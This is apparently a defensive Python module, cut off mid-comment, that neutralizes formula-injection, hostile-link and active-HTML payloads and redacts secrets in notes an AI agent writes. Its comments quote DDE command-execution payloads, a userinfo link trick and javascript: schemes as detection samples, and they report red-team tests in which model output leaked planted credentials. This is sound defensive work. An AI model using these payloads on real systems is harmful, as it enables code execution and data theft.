# /// script
# requires-python = ">=3.11"
# ///
# Copyright 2026 Exabeam, Inc.
# SPDX-License-Identifier: Apache-2.0
"""Output-side active-content neutralizer -- the a10 (export / formula injection) fix.

Applied to content Raffkin WRITES back through the bridge (case notes, alert/case updates) so a payload
planted in telemetry cannot fire when that persisted artifact is later exported. Scope is deliberately
narrow -- "do no harm; stop the obvious; document the exotic" -- to two ACTIVE-content forms:

  1. FORMULA cells (=HYPERLINK(...), @SUM(...), =cmd|'..'!A0): quote-prefixed inert, and any URL on the
     formula's line is defanged. Stops CSV / formula injection on spreadsheet export.
  2. LINKS -- markdown in every CommonMark/GFM form (inline [text](target) with or without a title or
     padding, reference definitions [ref]: target, autolinks <target>) and HTML (href/src/action/...
     attributes, srcset, CSS url() in style attributes and <style> blocks): the target is defanged
     (host -> [.], scheme -> hxxp, javascript: -> [:]) UNLESS it points into the operator's own tenant.
     "Clickable is decided by destination, not authorship" (#147): the model writes the text, so
     "Raffkin wrote this link" carries no trust; a URL to the operator's own console is verifiable
     against config, anything else is not. The allowlist is derived from EXABEAM_MCP_URL by the bridge
     (tenant_hosts_from_url) -- never curated, never model-influenced -- and defaults to EMPTY, so with
     no config every link is defanged (the safe default the red-team harness grades under).
  2b. ACTIVE HTML that is never a link anyone wants: script/iframe/object/embed/svg/math elements are
     removed, form/meta/base/link tags are made inert, on*= event handlers are dropped, and in a MAIL
     body (mail=True) even a bare URL in text is defanged because mail clients auto-link it. The mail
     template's inline styles, bgcolor and entities pass through untouched (do-no-harm corpus in tests).
  3. SECRETS / STRUCTURED PII (the class-D redaction fix, #88 / assessment F-04): a credential or
     structured government identifier planted in telemetry must not survive verbatim into a persisted
     case note / export -- a durable, broader-audience artifact. Prompt-only redaction was measured
     leaking 100% (red-team d01/d03), so this is deterministic. Each match is replaced with a typed
     placeholder [REDACTED:<kind>] so the report still says "a credential was here" without the value.

  neutralize_output(text) -> (clean_text, notes)     # notes: list of {"type","original"} that changed

DOCUMENTED RESIDUALS (out of scope, by decision):
  - a BARE URL typed in prose (not a markdown link, not on a formula line) is left UNTOUCHED -- defanging
    every URL would mangle the legit reference links analysts write in notes (do harm).
  - an OPEN REDIRECT on the tenant host would pass the allowlist. That is the same trust already
    extended to the console itself; chasing it means URL-path analysis and is not worth it (#147).
  - HTML is neutralized by a tag-and-attribute pass, not a full parser: a '>' inside a quoted attribute
    value is handled, but malformed markup that a lenient renderer "fixes" into something different
    (unclosed quotes spanning tags) is escaped conservatively rather than reasoned about.
  - an ALL-ALPHABETIC value after a BARE LINE BREAK ("Recovered credential\ncorrecthorsebatterystaple")
    is not caught: after a line break, a word with no digit and no delimiter is indistinguishable from
    recommendation prose ("credential\nRotation is required immediately"), and redacting it would eat
    real analyst text. Labeled (`password: X`), wrapped (`X` / "X"), and markdown-TABLE forms are all
    caught regardless of shape -- this residual is only the bare-newline-plus-dictionary-word case.
  - FREE-FORM PII (names, home addresses) and DATE-shaped values (DOB) are NOT redacted: a home address
    is not reliably regex-detectable, and a date is indistinguishable from the timestamp on every log
    line (redacting it would gut legitimate reports). These stay a best-effort SKILL-prompt ask.
  - the operator's own on-screen chat is not a sink here: they are authorized to read the raw telemetry,
    so display crosses no trust boundary. This gates the WRITE path (what gets persisted), not the console.

Redaction is HIGH-SPECIFICITY only -- format/prefix/checksum/label-anchored, never blind entropy -- so a
hash, UUID, IP, or hostname in a legitimate report passes through untouched (see the FP corpus in tests).
"""
import html as _html
import re
from urllib.parse import urlsplit

__all__ = ["neutralize_output", "redact_secrets", "tenant_hosts_from_url", "is_allowed_host"]

# --- secret / structured-PII redaction (#88) ----------------------------------------------------------
# Each entry: (kind, compiled regex). Order matters only for overlapping matches (private-key blocks
# before generic tokens). Every pattern is anchored on a structural signal a legitimate value would not
# carry, to keep false positives near zero:
#   - AWS keys: the AKIA/ASIA prefix + fixed length
#   - vendor tokens: distinctive, registered prefixes (ghp_, glpat-, xoxb-, sk_live_, AIza, JWT eyJ...);
#     OpenAI/Anthropic sk- keys by shape -- a known sub-prefix (sk-proj-, sk-svcacct-, sk-admin-,
#     sk-ant-api03-) or 32+ unbroken alphanumerics -- so a hostname or branch like sk-prd-db-0001 is left
#     alone. Every lookahead is bounded, so a run like sk-sk-sk-... stays linear
#   - private keys: the PEM armor
#   - labeled secrets: a credential KEYWORD immediately preceding the value (password=, --secret-key X)
#   - SSN: the exact \d{3}-\d{2}-\d{4} shape (rare in logs); credit cards are Luhn-verified below
_SECRET_PATTERNS = [
    ("private-key", re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----.*?-----END (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----", re.S)),
    ("aws-key", re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b")),
    ("jwt", re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b")),
    ("token", re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr|github_pat)_[A-Za-z0-9_]{20,}\b")),
    ("token", re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b")),
    ("token", re.compile(r"\b(?:sk|pk|rk)_(?:live|test)_[A-Za-z0-9]{16,}\b")),
    ("token", re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b")),
    ("token", re.compile(r"\bglpat-[A-Za-z0-9_-]{20,}")),
    ("token", re.compile(r"\bsk-(?:(?:proj|svcacct|admin|ant-(?:api|admin)\d{2})-(?=[A-Za-z0-9_-]{0,64}\d)"
                         r"[A-Za-z0-9_-]{20,}|(?=[A-Za-z0-9]{0,64}\d)[A-Za-z0-9]{32,})")),
    ("ssn", re.compile(r"\b(?!000|666|9\d\d)\d{3}-(?!00)\d{2}-(?!0000)\d{4}\b")),
]
# Labeled secret: a credential keyword, a separator, then the value. Redacts only the VALUE, and only
# because a label vouches for it -- so a bare high-entropy string with no credential context is left
# alone (that is where blind entropy would create false positives). The keyword set and separator are
# broad on purpose: the live red-team (2026-08-18) showed the MODEL phrases labels its own way --
# "Secret Access Key: <v>", a value on the next line under a heading, a markdown-table cell -- so a
# rigid `key=value` anchor missed real leaks a unit test (which used the exact form) did not.
# The keyword's edges. `\b` would treat `_` as part of the word, so `aws_secret_access_key` and
# `service_password` -- the shape of every environment variable, config key and Terraform/Kubernetes
# secret an analyst pastes -- had no boundary before their keyword and never matched (review of #118).
# Letters and digits are the only word characters here; `_`, `-` and `.` all separate.
_KW_L, _KW_R = r"(?<![A-Za-z0-9])", r"(?![A-Za-z0-9])"
_KEYWORD = (
    r"passwo?r?d|passwd|pwd|pass[\s_-]?phrase|"
    r"secret[\s_-]?(?:access[\s_-]?)?key|access[\s_-]?key(?:[\s_-]?id)?|"
    r"api[\s_-]?(?:key|token|secret)|auth(?:orization)?[\s_-]?token|client[\s_-]?secret|"
    r"secret|token|bearer|credential|passcode")
# Delimiters that WRAP a value rather than belong to it. Matching excludes them from the value class
# would be wrong in both directions: exclude them and a backtick- or quote-wrapped secret is never seen
# (SKILL.md actively tells the model to wrap dangerous values in a code span, so that is the FORMAT WE
# ASK FOR); include them and the match swallows a markdown link's closing paren, disarming the link
# defanger downstream. So match permissively and hand the delimiters back at substitution time.
_OPEN_DELIMS, _CLOSE_DELIMS = "([{`\"'", ")]}`\"'"


# Sentence punctuation that can trail a structural delimiter ("...(see [x](url).", "...`secret`!").
# Peeled ONLY when a real closing delimiter is peeled with it -- otherwise a password that genuinely ends
# in punctuation ("Hunter2!") would have that character stripped out of the redacted span and disclosed.
_TRAIL_PUNCT = ".!?"


def _trim_delims(val, minlen):
    """Split a matched value into (lead, core, tail) by peeling wrapping delimiters. Returns None when the
    value must not be redacted: it is already a placeholder, or the core is shorter than minlen (so a run
    of punctuation never counts as a secret). O(len(val)) -- a per-character slice loop here is quadratic
    on an adversary-supplied delimiter run, and this input is attacker-controlled telemetry."""
    if "[REDACTED:" in val:              # never re-consume our own output: keeps the typed <kind> intact
        return None                      # (password: AKIA... -> [REDACTED:aws-key], not [[REDACTED:secret]])
    core = val.lstrip(_OPEN_DELIMS)
    lead = val[:len(val) - len(core)]
    # An UNMATCHED closing bracket ends the value: it belongs to the structure around it, and everything
    # after it does too. This is what keeps "…?token=abc123)." and "…?token=abc123)**now**" from having
    # their ")" (and trailing text) eaten -- peeling only from the end cannot see a delimiter with junk
    # behind it. Depth-tracked so a value with balanced brackets is not cut short.
    depth = {")": 0, "]": 0, "}": 0}
    pairs = {"(": ")", "[": "]", "{": "}"}
    cut = len(core)
    for i, ch in enumerate(core):
        if ch in pairs:
            depth[pairs[ch]] += 1
        elif ch in depth:
            if depth[ch] == 0:
                cut = i
                break
            depth[ch] -= 1
    stripped, tail = core[:cut], core[cut:]
    # Then peel any quote/backtick wrapper, plus sentence punctuation riding on a real closing delimiter.
    inner = stripped.rstrip(_CLOSE_DELIMS + _TRAIL_PUNCT)
    peeled = stripped[len(inner):]
    if peeled and any(c in _CLOSE_DELIMS for c in peeled):
        stripped, tail = inner, peeled + tail   # e.g. `secret`  ->  core=secret, tail=`
    return (lead, stripped, tail) if len(stripped) >= minlen else None


# STRONG separator: an explicit label assignment (`password: X`, `token=X`). The label vouches for the
# value, so any 6+ core is a secret -- you don't write "password: rotated". The label may itself be
# quoted -- a JSON or raw-field dump ("client_secret": "X", {"password":"X"}) puts a closing quote between
# the keyword and the separator (#118); the value's own quotes are peeled by _trim_delims and handed back.
_LABELED_SECRET_RE = re.compile(
    r"(?i)" + _KW_L + r"(" + _KEYWORD + r")" + _KW_R +
    r"([\"'`]?\s*[:=]\s*)"
    r"(?P<val>[^\s,;<>|]{6,})")
# STRONG separator, table form: a markdown table ROW whose cell is exactly a credential keyword labels
# the cell beside it -- structurally a label/value pair, so no shape guard is needed. Anchored to ^| so
# an INLINE pipe in prose ("Evidence: token | source: pastebin") stays with the weak rule below.
# A GFM table delimiter row: |---|:---:|---| . Its presence marks the line ABOVE as a header row.
_TABLE_DELIM_RE = re.compile(r"^\s*\|?[\s:|-]*-[\s:|-]*\|[\s:|-]*$")
_TABLE_ROW_SECRET_RE = re.compile(
    r"(?im)^(\|[^\n]*?" + _KW_L + r"(?:" + _KEYWORD + r")" + _KW_R + r")(\s*\|\s*)"
    r"(?P<val>[^\s,;<>|]{6,})")
# WEAK separators -- a copula ("secret was rotated") or a bare line break ("API token\nAKIA...") -- are
# AMBIGUOUS: what follows is usually recommendation prose ("rotated", "Rotate", "Disable"), not the
# secret. These require a secret-SHAPED core: 12+ chars with a digit AND a letter, the same heuristic
# _SPACE_SECRET_RE uses for the identical ambiguity. Documented consequence: a purely ALPHABETIC
# passphrase after a bare line break ("Recovered credential\ncorrecthorsebatterystaple") is NOT caught --
# a line break genuinely cannot be told from prose. Labeled, quoted, and table forms all are.
_WEAK_SEP_SECRET_RE = re.compile(
    r"(?i)" + _KW_L + r"(" + _KEYWORD + r")" + _KW_R +
    r"(\s+(?:is|was)\s+|\s*[\r\n|]+\s*[-*|]?\s*)"
    r"(?P<val>(?=[^\s]*\d)(?=[^\s]*[A-Za-z])[^\s,;<>|]{12,})")
# Plain-space separator (a CLI flag like `--secret-key <v>`) is ambiguous — "password protection" would
# false-positive. So a space-separated value is redacted ONLY if it LOOKS secret-like: 12+ chars with at
# least one digit AND one letter (a dictionary word like "protection" has no digit and is spared).
_SPACE_SECRET_RE = re.compile(
    r"(?i)" + _KW_L + r"(" + _KEYWORD + r")" + _KW_R + r"\s+"
    r"(?P<val>(?=[^\s]*\d)(?=[^\s]*[A-Za-z])[A-Za-z0-9+/=_$.\-]{12,})")
# The final digit must not carry a separator, or the match eats the space after the number and the
# sentence closes up ("[REDACTED:credit-card]was charged") -- a do-no-harm defect on legitimate text.
_CC_CANDIDATE_RE = re.compile(r"\b(?:\d[ -]?){12,18}\d\b")
# AWS secret access keys are exactly 40 base64 chars with no intrinsic prefix -- bare, they are
# indistinguishable from a hash (redacting all 40-char b64 => heavy false positives). But an AWS leak
# almost always carries the paired ACCESS key (AKIA/ASIA...), which IS intrinsically detectable. So:
# only when an access key is present in the text, redact 40-char base64 secrets. Proximity to the
# intrinsic marker is what makes this low-FP.
_AWS_ACCESS_KEY_RE = re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b")
_B64_40_RE = re.compile(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{40}(?![A-Za-z0-9+/=])")


def _luhn_ok(digits):
    total, alt = 0, False
    for ch in reversed(digits):
        d = ord(ch) - 48
        if alt:
            d *= 2
            if d > 9:
                d -= 9
        total += d
        alt = not alt
    return total % 10 == 0


def redact_secrets(text, notes=None):
    """Replace credentials and structured government identifiers with typed [REDACTED:<kind>] markers.
    High-specificity only -- see module docstring for what is deliberately NOT redacted. Pure; appends a
    {"type":"redact:<kind>", "original": <masked-preview>} note per hit when `notes` is given. Never
    records the secret itself in the note (a redactor must not re-leak into the audit trail)."""
    if not text:
        return text
    ns = notes if notes is not None else []
    # Snapshot the AWS-access-key signal BEFORE any redaction — the intrinsic pass below rewrites AKIA to
    # a placeholder, which would blind the proximity rule that keys off it.
    had_aws_key = bool(_AWS_ACCESS_KEY_RE.search(text))

    def _note(kind):
        ns.append({"type": f"redact:{kind}", "original": f"<{kind} redacted>"})

    for kind, rx in _SECRET_PATTERNS:
        def _sub(m, _k=kind):
            _note(_k)
            return f"[REDACTED:{_k}]"
        text = rx.sub(_sub, text)

    def _labeled_min(minlen):
        def _sub(m):
            trimmed = _trim_delims(m.group("val"), minlen)
            if trimmed is None:                      # punctuation only -- not a secret
                return m.group(0)
            lead, _core, tail = trimmed
            _note("secret")
            # Hand the wrapping delimiters back: the link keeps its ")", the code span its backticks,
            # so the downstream link defanger / formula passes still see the structure they need.
            return m.group(1) + m.group(2) + lead + "[REDACTED:secret]" + tail
        return _sub
    text = _LABELED_SECRET_RE.sub(_labeled_min(6), text)
    # A GFM HEADER row is always followed by a delimiter row (|---|---|), and its cells are column
    # names, not values -- redacting there mangles an ordinary findings table ("| Token | Source |
    # First seen |"). Skip those rows; apply the label/value rule to the rest.
    lines = text.split("\n")
    for i, line in enumerate(lines):
        if i + 1 < len(lines) and _TABLE_DELIM_RE.match(lines[i + 1]):
            continue
        lines[i] = _TABLE_ROW_SECRET_RE.sub(_labeled_min(6), line)
    text = "\n".join(lines)
    text = _WEAK_SEP_SECRET_RE.sub(_labeled_min(12), text)

    def _space_labeled(m):
        _note("secret")
        return m.group(1) + " [REDACTED:secret]"
    text = _SPACE_SECRET_RE.sub(_space_labeled, text)

    def _cc(m):
        digits = re.sub(r"[ -]", "", m.group(0))
        if 13 <= len(digits) <= 19 and _luhn_ok(digits):
            _note("credit-card")
            return "[REDACTED:credit-card]"
        return m.group(0)
    text = _CC_CANDIDATE_RE.sub(_cc, text)

    # AWS secret-by-proximity: only if an AWS access key is present (the leak signature), redact bare
    # 40-char base64 blobs -- the paired secret. Skips our own placeholder. Off entirely without the
    # access-key signal, so a lone hash elsewhere is never touched.
    if had_aws_key:
        def _awssec(m):
            _note("aws-secret")
            return "[REDACTED:aws-secret]"
        text = _B64_40_RE.sub(_awssec, text)

    return text

_FORMULA_CALL_RE = re.compile(r"^[=+\-@][\w.$]*\(")                 # sign + name + "(" : =HYPERLINK(, @SUM(
# Mid-line (prose-position) formulas. A formula the model QUOTES in running text -- after a label colon
# ("username field: =HYPERLINK(..."), inside backticks, in a bullet -- is not cell-leading, but the
# verbatim string re-arms the moment it is copy-pasted into a sheet or re-celled by a CSV export, so it
# is not a safe "mention" the way a bare URL is. Cell positions keep the generic sign+name+( detector;
# mid-line detection requires a KNOWN dangerous function name (high specificity, same philosophy as
# redaction) so prose like "score =high(ish)" or "@channel (all hands)" is never touched. (?<!') skips
# occurrences already quote-prefixed by the cell-position passes.
# (?<![\w']) blocks occurrences already quote-prefixed AND hyphenated prose ("on-call (rotation)",
# "auto-exec (enabled)" -- the sign glued to a preceding word is prose, not a formula). Function names
# that are also English words (EXEC, CALL, REGISTER, RTD) additionally require the "(" with no space.
# Two forms the allowlist alone missed (#120 phase B):
#   - a DDE CHANNEL reference quoted mid-prose -- =cmd|'/C calc'!A0, =MSEXCEL|'..\cmd.exe /c calc'!A1,
#     @SUM(cmd|' /C calc'!A0) -- the highest-severity formula payload, which has no function name to
#     allowlist. Recognized by its structure: sign, program name, "|", a bounded topic, "!", an item.
#     Prose never has a sign-led word immediately followed by a pipe and a bang.
#   - a CELL REFERENCE glued to the sign -- B2=HYPERLINK("…") -- which the word-glue lookbehind read as
#     prose. A1-style prefix only (1-3 letters, 1-7 digits): "score=high(" is still prose.
_CELL_REF = r"(?:[A-Za-z]{1,3}\d{1,7})?"
_MID_LINE_FORMULA_RE = re.compile(
    r"(?<![\w'])" + _CELL_REF + r"[=+\-@](?:(?:HYPERLINK|WEBSERVICE|FILTERXML|IMPORT(?:XML|DATA|HTML|FEED|RANGE)|"
    r"DDE(?:AUTO)?)\s*\(|(?:EXEC|CALL|REGISTER|RTD)\(|"
    r"(?:[\w.$]*\()?[A-Za-z][\w.]*\|[^|!\n]{1,200}![\w'$.]{1,20})",     # DDE channel: prog|topic!item
    re.IGNORECASE)
_DDE_RE = re.compile(r"\|\S[^|!]*!")                                # DDE channel ref: cmd|'/C calc'!A0
_QUOTED_FORMULA_RE = re.compile(r'"(\s*)([=+\-@][^"]*)')            # a quoted field value: "=HYPERLINK(...)"
_MD_CELL_RE = re.compile(r"(\|[ \t]*)([^|\n]*)")                    # a markdown-table cell
# A markdown link in every inline shape CommonMark accepts (#119): one level of balanced brackets in the
# text ([see [1]](url)), whitespace padding inside the parens, an optional title ("t" / 't' / (t)), and
# the <target> angle form. Group 2 is the target, with or without its angle brackets.
_MD_LINK_RE = re.compile(
    r"(\[(?:[^\[\]]|\[(?:[^\[\]]|\[(?:[^\[\]]|\[[^\[\]]*\])*\])*\])*\]\(\s*)"
    r"(<[^<>\s]*>|[^\s()]+(?:\([^\s()]*\)[^\s()]*)*)"
    r"((?:\s+(?:\"[^\"]*\"|'[^']*'|\([^()]*\)))?\s*\))")
# A link-reference definition ([ref]: target "title"), up to three leading spaces, at line start.
# CommonMark lets the destination sit on the NEXT line after "[ref]:" -- allow one line break.
_MD_REF_DEF_RE = re.compile(r"(?m)^([ ]{0,3}\[[^\]\n]+\]:[ \t]*\n?[ \t]*)(<[^<>\s]*>|\S+)")
# A GFM autolink: <https://…> / <www.…>. Kept in its angle brackets; the inside is defanged.
_MD_AUTOLINK_RE = re.compile(r"<((?:https?|ftps?)://[^\s<>]+|www\.[^\s<>]+)>", re.IGNORECASE)
_URL_RE = re.compile(r"(?P<scheme>(?:https?|ftps?)://|www\.)(?P<rest>[^\s<>\"'\)\]}]+)", re.IGNORECASE)
_DANGER_SCHEME_RE = re.compile(
    r"(?i)(?<![a-z0-9])(javascript|vbscript|data|file)(?:\s|&#?\w+;)*(?::|&#0*58;|&#x0*3a;|&colon;)")
_HOST_RE = re.compile(r"^(//)?([A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)(.*)$", re.S)


# --- the tenant allowlist (#147: "clickable is decided by destination, not authorship") --------------------

def tenant_hosts_from_url(url):
    """The operator's own tenant host, derived from EXABEAM_MCP_URL and nothing else: EXACTLY the API host
    (https://api.<region>.exabeam.cloud/mcp -> api.<region>.exabeam.cloud). No wildcard: an earlier cut
    also allowed every host under the region domain, and a region is shared by every tenant in it -- any
    host there serving tenant-supplied content would have made one tenant's content clickable in
    another's mail (raised in review by the PM, 2026-09-06). A missing/unparseable URL yields the EMPTY
    set, under which every link is defanged."""
    try:
        h = (urlsplit(url.strip()).hostname or "").lower().rstrip(".")
    except (ValueError, AttributeError):
        return frozenset()
    if not h or not re.fullmatch(r"[a-z0-9.-]+", h):
        return frozenset()
    return frozenset({h})


def is_allowed_host(host, allowed):
    """Exact host match only -- no suffix, no wildcard."""
    h = (host or "").lower().rstrip(".")
    return bool(h) and h in allowed


def _url_allowed(url, allowed):
    """Is this URL, as a renderer would see it, a live link we keep? Only http(s) to an allowed host, with
    no userinfo trick (https://tenant@evil.example), no backslash / whitespace / control-character
    smuggling, and no other scheme at all -- mailto:, tel:, ftp: are defanged like everything else."""
    if not allowed or not url:
        return False
    u = url.strip()
    if re.search(r"[\\\s\x00-\x1f\x7f]", u):
        return False
    m = re.match(r"^(?:(https?)://|//)", u, re.IGNORECASE)
    if not m:
        return False
    try:
        p = urlsplit(u if m.group(1) else "https:" + u)
        if p.username is not None or p.password is not None:
            return False
        return is_allowed_host(p.hostname, allowed)
    except ValueError:
        return False


def _defang_url(m):
    scheme, rest = m.group("scheme"), m.group("rest")
    host, tail = re.match(r"([^/?#]*)(.*)", rest, re.S).groups()
    scheme = re.sub(r"(?i)http", "hxxp", scheme)
    scheme = re.sub(r"(?i)ftp", "fxp", scheme)
    scheme = re.sub(r"(?i)www\.", "www[.]", scheme)
    return scheme + host.replace(".", "[.]") + tail


# A special scheme with its slashes missing or halved ("https:evil.example", "https:/evil.example") is
# REPAIRED to "https://evil.example" by every browser's URL parser, so it is a live link. Normalize it
# before deciding, so the defanger sees what the renderer will see.
_SLASHLESS_SCHEME_RE = re.compile(r"(?i)\b(https?|ftps?):(?!//)/?(?=[A-Za-z0-9\[])")


def _defang(s, allowed=frozenset()):
    """Defang dangerous schemes + scheme/www URLs in a string, leaving URLs into the allowed tenant hosts
    live. Applied to link targets, formula-carrying lines, HTML attribute values and (in mail) text --
    never to bare prose in a case note (the documented residual)."""
    s = _SLASHLESS_SCHEME_RE.sub(lambda m: m.group(1) + "://", s)
    s = _DANGER_SCHEME_RE.sub(lambda m: m.group(1) + "[:]", s)
    return _URL_RE.sub(lambda m: m.group(0) if _url_allowed(m.group(0), allowed) else _defang_url(m), s)


def _defang_target(t, allowed=frozenset()):
    """Defang a markdown-link target: a scheme URL / dangerous scheme, or a scheme-less dotted host (which
    a renderer linkifies). A relative path / anchor with no dotted host is left alone. A target into the
    allowed tenant hosts stays live."""
    angled = len(t) > 1 and t[0] == "<" and t[-1] == ">"
    raw = t[1:-1] if angled else t
    core = raw.replace("\\", "/")                       # a backslash is a slash to the URL parser
    normalized = core != raw
    wrap = (lambda s: "<" + s + ">") if angled else (lambda s: s)
    if _url_allowed(core, allowed) or _url_allowed("https://" + core, allowed) and _HOST_RE.match(core):
        return wrap(core) if normalized else t
    d = _defang(core, allowed)
    if d == core:
        m = _HOST_RE.match(core)
        if m:
            slashes, host, tail = m.groups()
            d = (slashes or "") + host.replace(".", "[.]") + tail
    if d == core and not normalized:
        return t
    return wrap(d)


def _is_formula(cell):
    """True only if a spreadsheet would EXECUTE this cell: it opens with =/@/+/- AND the danger signal is
    STRUCTURALLY ATTACHED -- a function call right after the sign (=HYPERLINK(, @SUM(, +WEBSERVICE() or a
    DDE channel reference (cmd|'..'!A0). A bare (, !, or | merely appearing SOMEWHERE in the text does NOT
    count -- so an analyst line like '- pending (review)', '- fixed! ok', '-5 (approx)', '@channel (all
    hands)', or '=summary: 3 accounts (contained)' opens with one of those chars but is plain prose and is
    left ALONE (do no harm)."""
    s = cell.strip()
    if len(s) < 2 or s[0] not in "=@+-":
        return False
    return bool(_FORMULA_CALL_RE.match(s) or _DDE_RE.search(s))


def _neutralize_formulas(text, notes, allowed=frozenset()):
    out = []
    for line in text.splitlines(keepends=True):
        core, nl = (line[:-1], line[-1:]) if line.endswith("\n") else (line, "")
        found = False

        if "|" in core:                                     # markdown-table cells
            def _md(m):
                nonlocal found
                pad, cell = m.group(1), m.group(2)
                if not _is_formula(cell):
                    return m.group(0)
                found = True
                notes.append({"type": "formula", "original": cell.strip()[:60]})
                return pad + "'" + cell.lstrip()
            core = _MD_CELL_RE.sub(_md, core)

        fields = core.split("\t")                           # line start + tab-separated fields
        for i, field in enumerate(fields):
            stripped = field.lstrip()
            if _is_formula(stripped):
                found = True
                notes.append({"type": "formula", "original": stripped[:60]})
                fields[i] = field[: len(field) - len(stripped)] + "'" + stripped
        core = "\t".join(fields)

        def _q(m):                                          # quoted field values
            nonlocal found
            val = m.group(2)
            if not _is_formula(val):
                return m.group(0)
            found = True
            notes.append({"type": "formula", "original": val[:60]})
            return '"' + m.group(1) + "'" + val
        core = _QUOTED_FORMULA_RE.sub(_q, core)

        def _mid(m):                                        # known-dangerous formula quoted mid-prose
            nonlocal found
            found = True
            notes.append({"type": "formula", "original": m.group(0)[:60]})
            return "'" + m.group(0)
        core = _MID_LINE_FORMULA_RE.sub(_mid, core)

        if found:                                           # this line carries a formula -> defang its URL(s)
            core = _defang(core, allowed)
        out.append(core + nl)
    return "".join(out)


# A link destination: no whitespace, parens balanced. Nested to six levels in C (deeper falls back to a
# bounded Python walk). Both are capped at _MD_DEST_MAX chars so a page of `](` costs linear time, not
# quadratic -- a destination longer than that with no closing paren is not a link anyone renders.
_MD_DEST_MAX = 2048
_MD_DEEP_MAX = 16                                        # Python-walked deep destinations per call


def _nest(d):
    # Every loop iteration starts with '(' so a run of plain characters has one parse: no catastrophic
    # backtracking when an inner ')' is missing.
    return r"[^\s()]*" if d == 0 else r"[^\s()]*(?:\(" + _nest(d - 1) + r"\)[^\s()]*)*"
_MD_DEST_RE = re.compile(_nest(6))
_MD_RUN_RE = re.compile(r"[^\s]*")


def _md_dest_end(text, k, n, state):
    """End of a paren-balanced destination starting at k, or -1 when there is none within the cap. After
    _MD_DEEP_MAX deep (7+ level) destinations in one text the walk is skipped and the run is taken whole:
    over-defanged rather than reasoned about, and never quadratic."""
    lim = min(n, k + _MD_DEST_MAX)
    e = _MD_DEST_RE.match(text, k, lim).end()
    if e < lim and text[e] == "(":                       # deeper than the regex: walk it, bounded
        state[0] += 1
        if state[0] > _MD_DEEP_MAX:
            return _MD_RUN_RE.match(text, k, lim).end()
        depth, e = 0, k
        while e < lim:
            c = text[e]
            if c in " \t\n":
                break
            if c == "(":
                depth += 1
            elif c == ")":
                if depth == 0:
                    break
                depth -= 1
            e += 1
        if depth != 0:
            return -1
    return e


def _defang_md_inline_links(text, allowed, notes):
    """Every inline link / image `[text](dest "title")` whatever the bracket depth of the text or the paren
    depth of the destination (CommonMark allows both to be arbitrary, so a fixed-depth regex is a bypass).
    Scans for `](`, reads the destination, then rewrites it."""
    out, pos, i = [], 0, 0
    n = len(text)
    state = [0]
    while True:
        j = text.find("](", i)
        if j == -1:
            break
        i = j + 2
        k = j + 2                                        # first char of the destination region
        while k < n and text[k] in " \t":
            k += 1
        if k < n and text[k] == "<":                     # <dest>
            e = text.find(">", k, k + _MD_DEST_MAX)
            if e == -1 or "\n" in text[k:e]:
                continue
            dest_s, dest_e = k, e + 1
        else:
            e = _md_dest_end(text, k, n, state)
            if e <= k:
                continue
            dest_s, dest_e = k, e
        # optional title, then the closing paren
        t = dest_e
        while t < n and text[t] in " \t\n":
            t += 1
        if t < n and text[t] in "\"'(":
            close = {"\"": "\"", "'": "'", "(": ")"}[text[t]]
            te = text.find(close, t + 1, t + 1 + _MD_DEST_MAX)
            if te == -1:
                continue
            t = te + 1
            while t < n and text[t] in " \t\n":
                t += 1
        if t >= n or text[t] != ")":
            continue
        target = text[dest_s:dest_e]
        d = _defang_target(target, allowed)
        if d != target:
            notes.append({"type": "link", "original": target[:60]})
            out.append(text[pos:dest_s]); out.append(d); pos = dest_e
        i = t + 1
    out.append(text[pos:])
    return "".join(out)


# --- HTML (#147 / #119 item 3) -----------------------------------------------------------------------------
# A tag-and-attribute pass, not a DOM: it rewrites what a mail client or a renderer would act on and leaves
# everything else byte-identical. Order inside the pass: elements that execute are removed or made inert,
# then event handlers, then every URL-bearing attribute, then CSS url() in style attributes and blocks.

# Elements whose CONTENT is code, not text: removed with their content. An unclosed opener is made inert
# (its '<' escaped) rather than reasoned about -- a browser would treat the rest of the document as script.
_HTML_EXEC_ELEMENTS = r"script|iframe|object|embed|applet|svg|math|frameset|frame|noscript|template"
_HTML_BLOCK_OPEN_RE = re.compile(r"<\s*(" + _HTML_EXEC_ELEMENTS + r"|style)\b[^>]*>", re.IGNORECASE)


def _strip_code_blocks(text, notes, allowed):
    """Remove every exec element with its content; run <style> content through the CSS pass. One forward
    pass: an opener with no closer means every later opener of that element has none either, so the
    search is never repeated (a page of bare `<script>` openers was quadratic through `.*?`)."""
    out, pos, dead = [], 0, set()
    i = 0
    n = len(text)
    while i < n:
        m = _HTML_BLOCK_OPEN_RE.search(text, i)
        if not m:
            break
        name = m.group(1).lower()
        if name in dead:
            i = m.end(); continue
        c = re.compile(r"<\s*/\s*" + name + r"\s*>", re.IGNORECASE).search(text, m.end())
        if not c:
            dead.add(name)
            if name == "style":                          # no closer: a renderer treats the rest as CSS, with
                notes.append({"type": "html_strip", "original": "unclosed style"})   # its url()/@import fetches --
                out.append(text[pos:m.start()]); out.append("&lt;" + m.group(0)[1:])  # so the opener becomes text
                pos = m.end()
            i = m.end(); continue
        out.append(text[pos:m.start()])
        if name == "style":
            out.append(m.group(0) + _neutralize_css(text[m.end():c.start()], allowed, notes) + c.group(0))
        else:
            notes.append({"type": "html_strip", "original": name})
        pos = i = c.end()
    out.append(text[pos:])
    return "".join(out)
# Tags that are never content but change what a link/fetch means: made inert in place, inner text kept.
_HTML_INERT_TAGS = r"form|meta|base|link|input|button|select|textarea|" + _HTML_EXEC_ELEMENTS
_HTML_INERT_TAG_RE = re.compile(r"<(?=\s*/?\s*(?:" + _HTML_INERT_TAGS + r")\b)", re.IGNORECASE)
# A tag with its attribute region; quoted values may contain '>' without ending the tag. A '<' is never
# admitted, even inside quotes: it bounds every match at the next opener, which keeps the pass linear on
# hostile input (a page of `<a "` was quadratic). A tag that really carries '<' in a quoted value is
# escaped to text by _escape_broken_openers -- rendered literally, never live.
